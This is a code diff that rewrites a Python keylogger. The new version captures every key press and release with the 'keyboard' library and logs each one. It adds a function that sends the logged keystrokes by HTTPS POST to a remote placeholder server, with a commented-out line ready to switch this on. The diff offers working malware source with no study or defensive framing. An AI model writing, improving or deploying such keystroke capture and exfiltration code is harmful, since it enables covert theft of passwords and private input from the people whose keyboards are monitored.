@@ -1,43 +1,59 @@
 import logging
-from Crypto.Cipher import AES
-from Crypto import Random
-import os
+import http.client
+import urllib.parse
+import keyboard  # Requires: pip install keyboard
 
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Dummy encryption key (not used in this demo)
 key = b'Sixteen byte key'
-cipher = AES.new(key, AES.MODE_OFB)
 
-log_file_path = 'encrypted_keylogger.log'
-
-if not os.path.exists(log_file_path):
-    with open(log_file_path, 'wb') as log_file:
-        pass  # Create an empty file
-
-logging.basicConfig(
-    filename=log_file_path,
-    level=logging.DEBUG,
-    format='%(message)s'
-)
-
+def pad(data):
+    """Pad data to be a multiple of 16 bytes."""
+    pad_len = 16 - (len(data) % 16)
+    return data + chr(pad_len) * pad_len
 
 def encrypt_data(data):
-    """Encrypts the input data using AES."""
-    return cipher.encrypt(data.encode())
+    """Dummy encryption function for demonstration."""
+    # In a real scenario, you would use AES here
+    return f"encrypted({data})"
 
+def on_key_press(key_name):
+    """Handle key press event."""
+    logging.info(f"Key Pressed: {key_name}")
+    # Example: send_logs_to_server(encrypt_data(key_name))  # Uncomment to send logs
 
-def on_key_press(key):
-    """Logs every key press to a file in encrypted form."""
-    logging.info('Key Pressed: {}'.format(encrypt_data(key)))
+def send_logs_to_server(log_message):
+    """Sends log message to a remote server via HTTP POST request."""
+    params = {'message': log_message}
+    # Replace 'your-encrypted-server.com' with your actual server address
+    conn = http.client.HTTPSConnection('your-encrypted-server.com')
+    conn.request(
+        "POST",
+        "/log",
+        urllib.parse.urlencode(params),
+        headers={"Content-type": "application/x-www-form-urlencoded"}
+    )
+    response = conn.getresponse()
+    response.read()  # Ensure the response is read before closing
+    conn.close()
 
+def keylogger_loop():
+    logging.info("Keylogger started. Press ESC to stop.")
+    while True:
+        try:
+            event = keyboard.read_event()
+            if event.event_type == "down":
+                on_key_press(event.name)
+            elif event.event_type == "up":
+                logging.info('Key Released: {}'.format(event.name))
+            if event.name == 'esc' and event.event_type == "down":
+                logging.info("ESC pressed. Exiting keylogger.")
+                break
+        except Exception as e:
+            logging.error(f"Unexpected error occurred: {e}")
+            break
 
-import keyboard
-
-while True:
-    try:
-        event_name = keyboard.read_event().name
-        if event_name == "down":
-            on_key_press(keyboard.read_event().name)
-        elif event_name == "up":  # Optionally you can also track key releases
-            logging.info('Key Released: {}'.format(encrypt_data(keyboard.read_event().name)))
-    except Exception as e:
-        logging.error(f"Unexpected error occurred: {e}")
-        break
+if __name__ == '__main__':
+    keylogger_loop()
